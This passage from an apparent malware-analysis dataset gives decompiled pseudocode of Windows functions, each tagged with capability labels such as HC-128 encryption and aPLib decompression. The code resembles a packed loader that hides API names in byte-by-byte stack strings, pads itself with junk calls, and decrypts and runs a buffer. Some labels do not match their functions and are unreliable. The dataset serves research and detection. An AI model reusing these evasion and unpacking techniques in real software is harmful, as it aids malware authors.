*0x626b1fa = 0x72;\n            *0x9050c0 = 0xda4353b6;\n            *0x9050c4 = 0xffffffff;\n            *0x626b1f9 = 0x65;\n            *0x6275580 = 0;\n            *0x6275584 = 0;\n            *0x626b1f8 = 0x6b;\n            *0x8ff920 = 0;\n            *0x8ff924 = 0;\n            *0x626b1fb = 0x6e;\n            *0x626db28 = 0xf49a7ae6;\n            *0x626b201 = 100;\n            *0x626aa18 = 0;\n            *0x626aa1c = 0;\n            *0x626b1fe = 0x33;\n            *0x8ff930 = 0;\n            *0x8ff934 = 0;\n            *0x626b1ff = 0x32;\n            *0x905158 = 0;\n            *0x90515c = 0;\n            *0x626b200 = 0x2e;\n            *0x626b59c = 0xd3e982d8;\n            *0x626b202 = 0x6c;\n            *0x626b184 = NULL;\n            *0x626b1fd = 0x6c;\n            *0x905138 = 0xd732ca8a;\n            *0x626b203 = 0x6c;\n            *0x90205c = 0;\n            *0x626b1fc = 0x65;\n            *0x8f9e78 = 0;\n            *0x8f9e7c = 0;\n            *0x626b204 = 0;\n            var_bch = *0x905138;\n            var_b8h = *0x626b59c;\n            var_b0h = *0x90205c;\n            var_ach = *0x8f9e78;\n            var_80h = *0x8ff920;\n            var_7ch = *0x8ff930;\n            var_70h = *0x626db28;\n            var_4ch = *0x905158;\n            var_34h = *0x626b184;\n            var_14h = *0x9050c0;\n            var_10h = *0x6275580;\n            var_8h = *0x626aa18;\n            for (iStackY11968 = 0; iStackY11968 < 0x6c5728; iStackY11968 = iStackY11968 + 1) {\n                *0x626b0d0 = 0xea75bab6;\n                *0x626b0d4 = 0xffffffff;\n                uStackY11980 = *0x626b0d0;\n                if (*0x6274304 == 0x12cc) {\n                    var_20h = &stack0xffffd12f;\n                    var_24h = NULL;\n                    var_28h = NULL;\n                    var_2ch = 0x42dbb5;\n                    (*_sym.imp.GDI32.dll_GetEnhMetaFileBits)();\n                    *0x902648 = 0xfc6c5d4a;\n                    uStackY11992 = *0x902648;\n                }\n                *0x626b56c = 0xdc9ef682;\n                uStackY11972 = *0x626b56c;\n                if (iStackY11968 == 0x412811) {\n                    var_20h = 0x626b1f8;\n                    var_24h = 0x42dc70;\n                    *0x626db2c = (*_sym.imp.KERNEL32.DLL_LoadLibraryA)();\n                }\n                *0x626aa10 = 0xa8975320;\n                uStackY11984 = *0x626aa10;\n                if (*0x6274304 == 0xa67) {\n                    var_20h = &stack0xffffd114;\n                    var_24h = NULL;\n                    var_28h = NULL;\n                    var_2ch = NULL;\n                    var_30h = NULL;\n                    var_34h = &stack0xffffd118;\n                    var_38h = 0;\n                    var_3ch = 0x42dcd3;\n                    (*_sym.imp.ole32.dll_OleCreateLink)();\n                    *0x90261c = 0xdda3e8d0;\n                    uStackY12016 = *0x90261c;\n                }\n                *0x626b1b0 = 0xf9d5cc24;\n                *0x626b1b4 = 0xffffffff;\n                uStackY11976 = *0x626b1b0;\n            }\n            *0x626aa2c = 0x75;\n            *0x626b0ac = 0xae2bff48;\n            *0x626aa30 = 0x72;\n            *0x626b568 = 0xd6566628;\n            *0x626aa2b = 0x74;\n            *0x902054 = 0;\n            *0x626aa34 = 99;\n            *0x626dba4 = 0;\n            *0x626aa29 = 0x69;\n            *0x9020b0 = NULL;\n            *0x9020b4 = 0;\n            *0x626aa31 = 0x6f;\n            *0x9020ec = 0xe8f7a248;\n            *0x626aa2f = 0x50;\n            *0x626b1a0 = 0xcc1687a8;\n            *0x626aa33 = 0x65;\n            *0x902108 = 0;\n            *0x626aa35 = 0x74;\n            *0x62755a0 = 0;\n            *0x626aa28 = 0x56;\n            *0x9050b0 = 0;\n            *0x626aa2a = 0x72;\n            *0x905108 = 0x9eac06f4;\n            *0x90510c = 0xffffffff;\n            *0x626aa2d = 0x61;\n            *0x9050e4 = 0xcf5f8584;\n            *0x626aa2e = 0x6c;\n            *0x626b06c = 0xfc281834;\n            *0x626aa32 = 0x74;\n            *0x9020c8 = 0xebcee694;\n            *0x626aa36 = 0;\n            var_20h = 0x626aa28;\n            var_24h = *0x626db2c;\n            var_28h = 0x42e1e4;\n            var_a8h = *0x626b1a0;\n            var_90h = *0x9020ec;\n            var_88h = *0x902054;\n            var_84h = *0x902108;\n            var_6ch = *0x626b06c;\n            var_64h = *0x626b568;\n            var_60h = *0x9050e4;\n            var_48h = *0x9020b0;\n            var_30h = *0x62755a0;\n            var_2ch = *0x626dba4;\n            var_1ch = *0x626b0ac;\n            var_18h = *0x905108;\n            var_4h = *0x9050b0;\n            *0x902088 = (*_sym.imp.KERNEL32.DLL_GetProcAddress)();\n            for (iStackY12020 = 0; iStackY12020 < 0x161e3; iStackY12020 = iStackY12020 + 1) {\n                *0x626db38 = 0xd56d7262;\n                if (*0x6274304 == 0xf76) {\n                    *0x8ffdc8 = 0xf2c46d48;\n                    *0x8ffdcc = 0xffffffff;\n                    uStackY12040 = *0x8ffdc8;\n                }\n                *0x9050ac = 0;\n                uStackY12036 = *0x626db38;\n                uStackY12032 = *0x9050ac;\n                if (iStackY12020 == 0x72dd) {\n                    var_28h = &stack0xffffd0f4;\n                    var_2ch = var_74h;\n                    var_30h = *0x6274304;\n                    var_34h = *0x90264c;\n                    var_38h = 0x42e3e6;\n                    (**0x902088)();\n                }\n                *0x905118 = 0;\n                *0x90511c = 0;\n                uStackY12028 = *0x905118;\n                if (*0x6274304 == 0xb86) {\n                    var_28h = &stack0xffffd0f0;\n                    var_2ch = NULL;\n                    var_30h = NULL;\n                    var_34h = NULL;\n                    var_38h = 0;\n                    var_3ch = 0;\n                    var_40h = 0x42e4ad;\n                    (*_sym.imp.ole32.dll_StgOpenStorageOnILockBytes)();\n                    var_40h = 0;\n                    var_44h = NULL;\n                    var_48h = &stack0xffffd0dc;\n                    var_4ch = 0;\n                    var_50h = NULL;\n                    var_54h = 0x42e4c2;\n                    (*_sym.imp.USER32.dll_CascadeWindows)();\n                    *0x8ffdb0 = 0;\n                    uStackY12052 = *0x8ffdb0;\n                }\n                *0x9025d0 = 0xe34bef50;\n                *0x9025d4 = 0xffffffff;\n                uStackY12024 = *0x9025d0;\n            }\n            var_28h = 0x8f87f8;\n            var_2ch = *0x6274304;\n            var_30h = *0x90264c;\n            var_34h = 0x42e5b4;\n            fcn.0042b210(*0x90264c, *0x6274304, 0x8f87f8);\n            var_34h = 0x42e5ba;\n            (**0x90264c)();\n            *0x626b170 = 0;\n            var_24h = *0x626b170;\n            if (*0x6274304 == 0x4ad) {\n                var_34h = &stack0xffffd0d8;\n                var_38h = 0;\n                var_3ch = 0x42e626;\n                (*_sym.imp.ole32.dll_GetHGlobalFromILockBytes)();\n                var_3ch = 0;\n                var_40h = 0;\n                var_44h = L\"Sunugikalo vejajo siticevaci nutole ba\";\n                var_48h = L\"Geyolunuro sume\";\n                var_4ch = 0;\n                var_50h = 0x42e63c;\n                (*_sym.imp.USER32.dll_MessageBoxExW)();\n                var_50h = &stack0xffffd0c4;\n                var_54h = 0x42e649;\n                (*_sym.imp.ole32.dll_CoIsOle1Class)();\n                *0x626b130 = 0;\n                uStackY12076 = *0x626b130;\n            }\n            *0x902060 = 0x8aef8bb8;\n            var_30h = 0x42e726;\n            var_ch = *0x902060;\n            fcn.004034d8(var_2ch);\n            return;\n        }\n        *0x626db40 = 0x93a78b2e;\n        *0x626db44 = 0xffffffff;\n        var_da4h = *0x626db40;\n        if (*0x6274304 == 0xc37) {\n            var_ch = &fcn.0042b670::lpBuffer;\n            var_10h = 0x42bc40;\n            (*_sym.imp.KERNEL32.DLL_GlobalMemoryStatus)();\n            *0x905100 = 0;\n            var_df4h = *0x905100;\n        }\n        *0x626b05c = 0xf1e03cc2;\n        var_ch = &fcn.0042b670::var_d80h;\n        var_10h = NULL;\n        var_14h = 0x42bca8;\n        var_d90h = *0x626b05c;\n        (*_sym.imp.USER32.dll_GetMenuInfo)();\n        *0x626b5a0 = 0xe2d83092;\n        *0x626b5a4 = 0xffffffff;\n        var_d98h = *0x626b5a0;\n        if (*0x6274304 == 0x161) {\n            var_14h = &fcn.0042b670::var_e00h;\n            var_18h = NULL;\n            var_1ch = NULL;\n            var_20h = NULL;\n            var_24h = NULL;\n            var_28h = NULL;\n            var_2ch = 0x42bd5a;\n            (*_sym.imp.GDI32.dll_ScaleWindowExtEx)();\n            var_2ch = NULL;\n            var_30h = NULL;\n            var_34h = 0x42bd64;\n            (*_sym.imp.USER32.dll_GetSystemMenu)();\n            var_df8h = 0;\n            *0x8ffd84 = 0;\n            *0x8ffd80 = 0;\n        }\n        *0x902650 = 0;\n        var_14h = &fcn.0042b670::var_dd0h;\n        var_18h = NULL;\n        var_1ch = 0x42be19;\n        var_da8h = *0x902650;\n        (*_sym.imp.USER32.dll_GetMonitorInfoW)();\n        *0x9050e0 = 0xb3816934;\n        var_d84h = *0x9050e0;\n        if (*0x6274304 == 0x78c) {\n            var_1ch = NULL;\n            var_20h = NULL;\n            var_24h = 0x42be81;\n            sub.KERNEL32.DLL_Module32FirstW();\n            var_24h = NULL;\n            var_28h = &fcn.0042b670::var_1600h;\n            var_2ch = NULL;\n            var_30h = NULL;\n            var_34h = 0x42be94;\n            (*_sym.imp.KERNEL32.DLL_GetLocaleInfoW)();\n            *0x626db50 = 0;\n            *0x626db54 = 0;\n            var_1604h = *0x626db50;\n        }\n        *0x626b0a0 = 0;\n        *0x626b0a4 = 0;\n        var_1ch = &fcn.0042b670::lpTimeAdjustmentDisabled;\n        var_20h = &fcn.0042b670::lpTimeIncrement;\n        var_24h = &fcn.0042b670::lpTimeAdjustment;\n        var_28h = 0x42bfd6;\n        var_da0h = *0x626b0a0;\n        (*_sym.imp.KERNEL32.DLL_GetSystemTimeAdjustment)();\n        *0x90260c = 0;\n        var_d88h = *0x90260c;\n        if (*0x6274304 == 0x12e8) {\n            var_ch = NULL;\n            var_10h = &fcn.0042b670::var_1a08h;\n            var_14h = NULL;\n            var_18h = 0x42c080;\n            (*_sym.imp.KERNEL32.DLL_GetModuleFileNameA)();\n            var_18h = NULL;\n            var_1ch = 0x42c088;\n            (*_sym.imp.KERNEL32.DLL_SetConsoleOutputCP)();\n            *0x626b098 = 0xd1fc83be;\n            *0x626b09c = 0xffffffff;\n            var_1a0ch = *0x626b098;\n        }\n        *0x902084 = 0xd09b8210;\n        var_d9ch = *0x902084;\n        if ((((0x288b01 < var_d60h) && (var_d7ch != 0x1a3dd73e)) && (var_dcch != 0x3b8b97b1)) &&\n           (lpTimeIncrement != 0x2117558c)) {\n            *0x902144 = 0xa655e59a;\n            if (*0x6274304 == 0x11e0) {\n                *0x905148 = 0;\n                var_1a18h = *0x905148;\n            }\n            *0x9020b8 = 0xa2b9fbb8;\n            var_1a14h = *0x902144;\n            var_1a10h = *0x9020b8;\n            goto code_r0x0042c2c2;\n        }\n        var_d60h = var_d60h + 1;\n    } while( true );\n}\n",
        "token_count": 9982
    },
    "0042e730": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint fcn.0042e730(void)\n\n{\n    uint uVar1;\n    uint var_518h;\n    uint var_514h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x8ff953 = 0x6c;\n    *0x626b134 = 0xd93c4e44;\n    *0x8ff949 = 0x65;\n    *0x626b0b8 = 0x9f0d84e2;\n    *0x8ff94d = 0x6c;\n    *0x9020a4 = 0xfeea5e96;\n    *0x8ff94b = 0x6e;\n    *0x905150 = 0;\n    *0x8ff952 = 0x6c;\n    *0x6275568 = 0xac728168;\n    *0x8ff94f = 0x32;\n    *0x626b1c4 = 0;\n    *0x626b1c0 = 0;\n    *0x8ff948 = 0x6b;\n    *0x902654 = 0xc26e0bb0;\n    *0x8ff94a = 0x72;\n    *0x626b070 = 0xa1315f4a;\n    *0x626b074 = 0xffffffff;\n    *0x8ff951 = 100;\n    *0x626b1f4 = 0;\n    *0x8ff94c = 0x65;\n    *0x626b1b8 = 0xa32eeab4;\n    *0x8ff950 = 0x2e;\n    *0x626b1d8 = 0xec1d24fc;\n    *0x8ff94e = 0x33;\n    *0x626b1dc = 0;\n    *0x8ff954 = 0;\n    *0x626db2c = (*_sym.imp.KERNEL32.DLL_GetModuleHandleA)(0x8ff948);\n    *0x90215c = 0x74;\n    *0x626b590 = 0;\n    *0x902161 = 0x6c;\n    *0x626b11c = 0;\n    *0x90216f = 0x74;\n    *0x8f9e5c = 0xb3045dd4;\n    *0x902166 = 0x33;\n    *0x902618 = 0;\n    *0x902164 = 0x6c;\n    *0x901fe8 = 0xf56efaae;\n    *0x90215f = 0x6f;\n    *0x626b150 = 0;\n    *0x902169 = 0x6e;\n    *0x626db4c = 0;\n    *0x626db48 = 0;\n    *0x90216e = 0x6f;\n    *0x9020d0 = 0xd9e5169c;\n    *0x9020d4 = 0xffffffff;\n    *0x90216d = 0x68;\n    *0x9050dc = 0xabdb5578;\n    *0x902165 = 0x70;\n    *0x8ffd9c = 0;\n    *0x8ffd98 = 0;\n    *0x902159 = 0x72;\n    *0x626b17c = 0xfa471574;\n    *0x90216c = 0x73;\n    *0x6274300 = 0;\n    *0x90216a = 0x61;\n    *0x9025c0 = 0xa9c63602;\n    *0x90215a = 0x65;\n    *0x626b088 = 0;\n    *0x626b08c = 0;\n    *0x902158 = 0x43;\n    *0x626b1c8 = 0;\n    *0x902163 = 0x65;\n    *0x8ffdd8 = 0;\n    *0x8ffddc = 0;\n    *0x902167 = 0x32;\n    *0x8ffdc0 = 0xc3abdf2a;\n    *0x90215b = 0x61;\n    *0x626db30 = 0x99953baa;\n    *0x90215e = 0x54;\n    *0x626b1d0 = 0;\n    *0x626b1d4 = 0;\n    *0x902160 = 0x6f;\n    *0x902624 = 0xd2de9e18;\n    *0x902162 = 0x68;\n    *0x9020c0 = 0xf0774cea;\n    *0x9020c4 = 0xffffffff;\n    *0x902168 = 0x53;\n    *0x902658 = 0;\n    *0x90265c = 0;\n    *0x90216b = 0x70;\n    *0x901ff0 = 0;\n    *0x901ff4 = 0;\n    *0x90215d = 0x65;\n    *0x902018 = 0;\n    *0x90201c = 0;\n    *0x902170 = 0;\n    *0x626b5b3 = 0x73;\n    *0x626aa14 = 0xc36f67ae;\n    *0x626b5ac = 0x6c;\n    *0x8ffd74 = 0xa58dad6a;\n    *0x626b5b0 = 0x46;\n    *0x8ffdd0 = 0x8f4ef15c;\n    *0x8ffdd4 = 0xffffffff;\n    *0x626b5ad = 0x65;\n    *0x626db70 = 0xe9896eba;\n    *0x626db74 = 0xffffffff;\n    *0x626b5ae = 0x33;\n    *0x6274314 = 0;\n    *0x626b5b5 = 0x57;\n    *0x90200c = 0;\n    *0x626b5b2 = 0x72;\n    *0x8ff93c = 0;\n    *0x626b5b4 = 0x74;\n    *0x626b10c = 0x86aa4808;\n    *0x626b5b1 = 0x69;\n    *0x9050b4 = 0xb2452ba2;\n    *0x626b5a8 = 0x4d;\n    *0x9025b8 = 0;\n    *0x626b5af = 0x32;\n    *0x626b07c = 0xbeaa095a;\n    *0x626b5a9 = 0x6f;\n    *0x9020a8 = 0xb2db87f8;\n    *0x9020ac = 0xffffffff;\n    *0x626b5ab = 0x75;\n    *0x8f9e54 = 0;\n    *0x626b5aa = 100;\n    *0x6275564 = 0;\n    *0x626b5b6 = 0;\n    uVar1 = fcn.0042b670();\n    return uVar1;\n}\n",
        "token_count": 2068
    },
    "0042acd0": {
        "rules": [
            "encrypt data using HC-128/f6b71aea27f34766a10ff27131cf0227"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_a4h\n\nvoid __cdecl fcn.0042acd0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    char16_t *var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_8ch;\n    uint var_88h;\n    uint var_78h;\n    uint var_68h;\n    uint var_64h;\n    uint pAcl;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_44h;\n    uint var_40h;\n    uint32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_30h = *0x4380e0 ^ &stack0xfffffffc;\n    *0x8f9e40 = 0;\n    var_ch = *0x8f9e40;\n    if (arg_ch == 0xaef) {\n        var_18h = 0;\n        (*_sym.imp.ADVAPI32.dll_DuplicateToken)(0, 0, &var_18h);\n        *0x626b180 = 0xe75bc938;\n        var_14h = *0x626b180;\n    }\n    *0x626b1bc = 0;\n    var_10h = *0x626b1bc;\n    for (var_1ch = 0; var_1ch < arg_ch; var_1ch = var_1ch + 1) {\n        *0x8f9e48 = 0;\n        var_20h = *0x8f9e48;\n        if (arg_ch == 0x4bd) {\n            (*_sym.imp.KERNEL32.DLL_SetNamedPipeHandleState)(0, 0, 0, 0);\n            (*_sym.imp.ole32.dll_OleCreateDefaultHandler)(&var_40h, 0, &var_54h, &var_58h);\n            *0x902020 = 0;\n            var_44h = *0x902020;\n        }\n        *0x905128 = 0xedbd6c2e;\n        *0x90512c = 0xffffffff;\n        uVar1 = *(arg_8h + var_1ch);\n        var_24h = *0x905128;\n        uVar2 = fcn.00426ce0();\n        *(arg_8h + var_1ch) = uVar1 ^ uVar2;\n        *0x902640 = 0xb3f2d918;\n        *0x902644 = 0xffffffff;\n        var_28h = *0x902640;\n        if (arg_ch == 0x602) {\n            (*_sym.imp.ole32.dll_OleCreateFromDataEx)(0, &var_78h, 0, 0, 0, 0, 0, 0, &var_5ch, 0, 0, &var_64h);\n            (*_sym.imp.ADVAPI32.dll_AddAccessAllowedAceEx)(pAcl, 0, 0, 0, 0);\n            var_a0h = 0;\n            var_a4h = L\"Lugeha fozulubigahu rilake vu\";\n            sub.USER32.dll_DdeCreateStringHandleW(0);\n            *0x9025c4 = 0;\n            var_68h = *0x9025c4;\n        }\n        *0x626b0a8 = 0xbcbfe2c4;\n        var_2ch = *0x626b0a8;\n    }\n    *0x626b0c0 = 0;\n    *0x626b0c4 = 0;\n    var_4h = *0x626b0c0;\n    if (arg_ch == 0x428) {\n        (*_sym.imp.ole32.dll_OleCreateFromFileEx)(&var_9ch, 0, &var_88h, 0, 0, 0, 0, 0, 0, &var_8ch, 0, 0, &var_a0h);\n        *0x902130 = NULL;\n        var_a4h = *0x902130;\n    }\n    *0x902030 = 0;\n    *0x902034 = 0;\n    var_8h = *0x902030;\n    fcn.004034d8(var_a4h);\n    return;\n}\n",
        "token_count": 1086
    },
    "00407185": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00407185(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(param_2 + 4) & 0x7ff00000;\n    if (uVar1 != 0x7ff00000) {\n        return uVar1;\n    }\n    return *(param_2 + 4);\n}\n",
        "token_count": 91
    },
    "00421778": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.00421778(void)\n\n{\n    uint8_t *puVar1;\n    int32_t unaff_EBP;\n    uint32_t unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == unaff_EDI) {\n        puVar1 = *((unaff_ESI >> 5) * 4 + 0x6275600) + 4 + (unaff_ESI & 0x1f) * 0x40;\n        *puVar1 = *puVar1 & 0xfe;\n    }\n    fcn.004214c9(unaff_ESI);\n    return;\n}\n",
        "token_count": 157
    },
    "00426a50": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint32_t * fcn.00426a50(uint32_t *param_1, char param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar1 = param_1 & 3;\n    while (uVar1 != 0) {\n        if (*param_1 == param_2) {\n            return param_1;\n        }\n        if (*param_1 == '\\0') {\n            return NULL;\n        }\n        uVar1 = param_1 + 1 & 3;\n        param_1 = param_1 + 1;\n    }\n    while( true ) {\n        while( true ) {\n            uVar1 = *param_1;\n            uVar4 = uVar1 ^ CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2));\n            uVar3 = uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff;\n            puVar5 = param_1 + 1;\n            if (((uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff) & 0x81010100) != 0) break;\n            param_1 = puVar5;\n            if ((uVar3 & 0x81010100) != 0) {\n                if ((uVar3 & 0x1010100) != 0) {\n                    return NULL;\n                }\n                if ((uVar1 + 0x7efefeff & 0x80000000) == 0) {\n                    return NULL;\n                }\n            }\n        }\n        uVar1 = *param_1;\n        if (uVar1 == param_2) {\n            return param_1;\n        }\n        if (uVar1 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 8;\n        if (cVar2 == param_2) {\n            return param_1 + 1;\n        }\n        if (cVar2 == '\\0') break;\n        cVar2 = uVar1 >> 0x10;\n        if (cVar2 == param_2) {\n            return param_1 + 2;\n        }\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 0x18;\n        if (cVar2 == param_2) {\n            return param_1 + 3;\n        }\n        param_1 = puVar5;\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 591
    },
    "00427510": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n\nvoid __cdecl fcn.00427510(uint arg_8h)\n\n{\n    uint var_2ch;\n    uint32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = *0x4380e0 ^ &stack0xfffffffc;\n    *0x9025f0 = 0xe8f71920;\n    if (*0x6274304 == 0xf8f) {\n        *0x626b118 = 0xcc192780;\n        var_14h = *0x626b118;\n    }\n    *0x9020e4 = 0;\n    *0x902110 = arg_8h;\n    *0x626b168 = 0x82866b3a;\n    *0x626b16c = 0xffffffff;\n    var_ch = *0x9025f0;\n    var_8h = *0x626b168;\n    var_4h = *0x9020e4;\n    if (*0x6274304 == 0x17) {\n        (*_sym.imp.ole32.dll_WriteClassStg)(0, &var_2ch);\n        *0x626db68 = 0xcf6ceec4;\n        *0x626db6c = 0xffffffff;\n        var_18h = *0x626db68;\n    }\n    *0x626db60 = 0;\n    *0x626db64 = 0;\n    var_10h = *0x626db60;\n    fcn.004034d8(var_2ch);\n    return;\n}\n",
        "token_count": 398
    },
    "0042b210": {
        "rules": [
            "encrypt data using HC-128/425018b86d394d5ebff49c9438559e47"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042b210(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    uint var_c58h;\n    uint var_854h;\n    uint var_850h;\n    uint var_84ch;\n    uint var_848h;\n    uint var_844h;\n    uint var_840h;\n    uint var_83ch;\n    uint var_838h;\n    uint var_438h;\n    uint var_434h;\n    uint var_430h;\n    uint var_42ch;\n    uint hActCtx;\n    uint var_424h;\n    uint var_420h;\n    uint32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = *0x4380e0 ^ &stack0xfffffffc;\n    *0x8ff944 = 0;\n    var_ch = *0x8ff944;\n    if (*0x6274304 == 0x246) {\n        hActCtx = 0;\n        (*_sym.imp.KERNEL32.DLL_ZombifyActCtx)(0);\n        (*_sym.imp.ADVAPI32.dll_GetAclInformation)(0, &var_420h, 0, 0);\n        (*_sym.imp.GDI32.dll_CreateDIBPatternBrushPt)(0, 0);\n        *0x626b598 = 0xbb132bdc;\n        var_424h = *0x626b598;\n    }\n    *0x902630 = 0x95c5ea96;\n    var_4h = *0x902630;\n    fcn.00427510(*arg_10h);\n    *0x9025e8 = 0xcabdf9c6;\n    *0x9025ec = 0xffffffff;\n    var_10h = *0x9025e8;\n    if (*0x6274304 == 0xd00) {\n        (*_sym.imp.USER32.dll_ReleaseDC)(0, 0);\n        (*_sym.imp.ADVAPI32.dll_RegQueryInfoKeyA)\n                  (0, &var_838h, &var_850h, 0, &var_434h, &var_848h, &var_84ch, &var_840h, &var_83ch, &var_844h, \n                   &var_430h, var_438h);\n        (*_sym.imp.KERNEL32.DLL_GetThreadPriority)(0);\n        (*_sym.imp.USER32.dll_CopyIcon)(0);\n        *0x626db98 = 0xd358cbbe;\n        var_42ch = *0x626db98;\n    }\n    *0x902044 = 0;\n    var_18h = *0x902044;\n    fcn.0042acd0(arg_8h, arg_ch);\n    *0x902090 = 0;\n    *0x902094 = 0;\n    var_14h = *0x902090;\n    if (*0x6274304 == 0xf75) {\n        (*_sym.imp.KERNEL32.DLL_GetNumberFormatA)\n                  (0, 0, \"Hofazatinatiji cawoca zozuxewa lajufofivu rofoha\", 0, &var_c58h, 0);\n        *0x8f9e60 = 0xe6e7bcee;\n        *0x8f9e64 = 0xffffffff;\n        var_854h = *0x8f9e60;\n    }\n    var_8h = 0;\n    *0x901ffc = 0;\n    *0x901ff8 = 0;\n    fcn.004034d8(arg_ch);\n    return;\n}\n",
        "token_count": 851
    },
    "00401220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.00401220(uint arg_8h)\n\n{\n    code **in_ECX;\n    uint var_4h;\n    \n    fcn.00403544();\n    *in_ECX = vtable.std::logic_error.0;\n    fcn.00401400(arg_8h);\n    return in_ECX;\n}\n",
        "token_count": 75
    },
    "00401250": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401250(code **param_1)\n\n{\n    uint var_4h;\n    \n    *param_1 = vtable.std::logic_error.0;\n    fcn.00401440();\n    fcn.0040367d();\n    return;\n}\n",
        "token_count": 61
    },
    "00401350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.00401350(int32_t arg_8h)\n\n{\n    code **in_ECX;\n    uint var_4h;\n    \n    fcn.004035c5(arg_8h);\n    *in_ECX = vtable.std::logic_error.0;\n    fcn.00401400(arg_8h + 0xc);\n    return in_ECX;\n}\n",
        "token_count": 86
    },
    "004015b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004015b0(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint arg_ch_00;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar2 = fcn.00401480();\n    if (uVar2 < arg_ch) {\n        fcn.0040342e();\n    }\n    iVar3 = fcn.00401480();\n    var_4h = iVar3 - arg_ch;\n    if (arg_10h < var_4h) {\n        var_4h = arg_10h;\n    }\n    if (in_ECX == arg_8h) {\n        fcn.00401ad0(arg_ch + var_4h, *0x434c28);\n        fcn.00401ad0(0, arg_ch);\n    }\n    else {\n        cVar1 = fcn.00401bb0(var_4h, 0);\n        if (cVar1 != '\\0') {\n            uVar2 = var_4h;\n            iVar3 = fcn.00401720();\n            iVar3 = iVar3 + arg_ch;\n            arg_ch_00 = *(in_ECX + 0x18);\n            arg_8h_00 = fcn.00401c50();\n            fcn.00402690(arg_8h_00, arg_ch_00, iVar3, uVar2);\n            fcn.00401b70(var_4h);\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 381
    },
    "00401670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401670(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004010a0(arg_8h);\n    fcn.00401a40(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 66
    },
    "00401720": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
